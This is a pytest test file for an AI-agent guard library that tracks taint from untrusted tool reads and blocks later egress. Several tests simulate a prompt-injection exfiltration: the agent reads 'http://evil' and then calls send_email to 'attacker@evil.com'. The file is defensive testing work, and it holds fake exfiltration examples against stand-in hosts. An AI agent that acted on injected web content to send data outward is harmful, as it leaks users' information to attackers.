"""Tests for the taint-tracking flow engine (FlowPolicy / FlowRuleDetector)."""

from __future__ import annotations

import pytest

import agentbrake
from agentbrake import (
    AgentBrakeInterrupt,
    FlowPolicy,
    InterruptReason,
    block_exfiltration,
)
from agentbrake.flow import FlowRuleDetector
from agentbrake.types import RunState, ToolCall


def _call(name: str, args: dict | None = None) -> ToolCall:
    return ToolCall(name=name, args=args or {})


# --- FlowPolicy -----------------------------------------------------------

def test_declarative_and_fluent_policies_are_equivalent():
    declarative = FlowPolicy(
        sources={"read_webpage": "untrusted"},
        sinks={"send_email": "egress"},
        deny=[("untrusted", "egress")],
    )
    fluent = (
        FlowPolicy()
        .source("read_webpage", taint="untrusted")
        .sink("send_email", category="egress")
        .deny_flow(source="untrusted", sink="egress")
    )
    for p in (declarative, fluent):
        assert p.taint_for("read_webpage") == "untrusted"
        assert p.sink_category_for("send_email") == "egress"
        assert p.is_denied("untrusted", "egress") is True
        assert p.is_denied("sensitive", "egress") is False


def test_violations_lists_only_denied_active_labels():
    policy = FlowPolicy(deny=[("untrusted", "egress")])
    assert policy.violations({"untrusted", "sensitive"}, "egress") == ["untrusted"]
    assert policy.violations({"sensitive"}, "egress") == []


# --- FlowRuleDetector: check / apply_taint --------------------------------

def _policy() -> FlowPolicy:
    return block_exfiltration(
        untrusted_readers=["read_webpage"], egress_tools=["send_email"]
    )


def test_non_sink_call_is_never_flagged():
    det = FlowRuleDetector(_policy())
    state = RunState(taints=[])
    assert det.check(state, _call("read_webpage")) is None


def test_sink_without_active_taint_is_allowed():
    det = FlowRuleDetector(_policy())
    state = RunState()
    assert det.check(state, _call("send_email")) is None


def test_sink_with_active_denied_taint_is_blocked():
    det = FlowRuleDetector(_policy())
    state = RunState()
    state.calls.append(_call("read_webpage"))
    det.apply_taint(state, state.calls[-1])
    assert det.check(state, _call("send_email")) is InterruptReason.FLOW


def test_apply_taint_records_provenance_and_dedupes():
    det = FlowRuleDetector(_policy())
    state = RunState()
    state.calls.append(_call("read_webpage"))
    mark = det.apply_taint(state, state.calls[-1])
    assert mark is not None
    assert mark.label == "untrusted"
    assert mark.source_tool == "read_webpage"
    assert mark.call_index == 0

    # A second read of the same kind must not pile up a duplicate label.
    state.calls.append(_call("read_webpage"))
    assert det.apply_taint(state, state.calls[-1]) is None
    assert state.taint_labels() == {"untrusted"}


def test_apply_taint_ignores_non_source():
    det = FlowRuleDetector(_policy())
    state = RunState()
    state.calls.append(_call("send_email"))
    assert det.apply_taint(state, state.calls[-1]) is None


def test_explain_names_the_tainting_call():
    det = FlowRuleDetector(_policy())
    state = RunState()
    state.calls.append(_call("read_webpage"))
    det.apply_taint(state, state.calls[-1])
    info = det.explain(state, _call("send_email"))
    assert info["sink"] == "send_email"
    assert info["sink_category"] == "egress"
    assert info["violated_taints"] == ["untrusted"]
    assert info["tainted_by"][0]["source_tool"] == "read_webpage"


# --- Wired into guard: the headline attack --------------------------------

@pytest.fixture(autouse=True)
def _isolate_default_run():
    agentbrake._default_run = None
    yield
    agentbrake._default_run = None


@agentbrake.guard()
def dispatch(name: str, args: dict) -> str:
    if args.get("boom"):
        raise RuntimeError("tool failed")
    return f"{name}-ok"


def test_guard_blocks_prompt_injection_exfiltration():
    policy = block_exfiltration(
        untrusted_readers=["read_webpage"], egress_tools=["send_email"]
    )
    with agentbrake.run(
        allowed_tools=["read_webpage", "send_email"],
        budget_usd=10.0,
        flow_policy=policy,
    ) as r:
        # Reading attacker-controlled content taints the run.
        assert dispatch("read_webpage", {"url": "http://evil"}) == "read_webpage-ok"
        assert r.state.taint_labels() == {"untrusted"}

        # send_email is in the allow-list, yet the flow is forbidden.
        with pytest.raises(AgentBrakeInterrupt) as ei:
            dispatch("send_email", {"to": "attacker@evil.com"})

    assert ei.value.reason is InterruptReason.FLOW
    flow = ei.value.context["flow"]
    assert flow["sink"] == "send_email"
    assert flow["violated_taints"] == ["untrusted"]
    assert flow["tainted_by"][0]["source_tool"] == "read_webpage"
    # The blocked sink was intercepted before execution.
    assert [c.name for c in r.state.calls] == ["read_webpage"]


def test_egress_allowed_before_any_untrusted_read():
    policy = block_exfiltration(
        untrusted_readers=["read_webpage"], egress_tools=["send_email"]
    )
    with agentbrake.run(
        allowed_tools=["read_webpage", "send_email"],
        budget_usd=10.0,
        flow_policy=policy,
    ):
        # No taint active yet — sending is fine.
        assert dispatch("send_email", {"to": "ok@example.com"}) == "send_email-ok"


def test_failed_source_read_does_not_taint():
    policy = block_exfiltration(
        untrusted_readers=["read_webpage"], egress_tools=["send_email"]
    )
    with agentbrake.run(
        allowed_tools=["read_webpage", "send_email"],
        budget_usd=10.0,
        flow_policy=policy,
    ) as r:
        with pytest.raises(RuntimeError):
            dispatch("read_webpage", {"boom": True})  # read failed -> no content
        assert r.state.taint_labels() == set()
        # So egress is still permitted.
        assert dispatch("send_email", {"to": "ok@example.com"}) == "send_email-ok"


def test_taint_does_not_leak_across_runs():
    policy = block_exfiltration(
        untrusted_readers=["read_webpage"], egress_tools=["send_email"]
    )
    with agentbrake.run(
        allowed_tools=["read_webpage", "send_email"], budget_usd=10.0, flow_policy=policy
    ):
        dispatch("read_webpage", {"url": "http://evil"})
        with pytest.raises(AgentBrakeInterrupt):
            dispatch("send_email", {"to": "attacker@evil.com"})

    # Fresh run: the taint is gone, egress works again.
    with agentbrake.run(
        allowed_tools=["read_webpage", "send_email"], budget_usd=10.0, flow_policy=policy
    ):
        assert dispatch("send_email", {"to": "ok@example.com"}) == "send_email-ok"


def test_no_flow_policy_means_no_flow_enforcement():
    with agentbrake.run(allowed_tools=["read_webpage", "send_email"], budget_usd=10.0):
        dispatch("read_webpage", {"url": "http://evil"})
        # Without a policy, the flow detector is absent and egress is allowed.
        assert dispatch("send_email", {"to": "attacker@evil.com"}) == "send_email-ok"
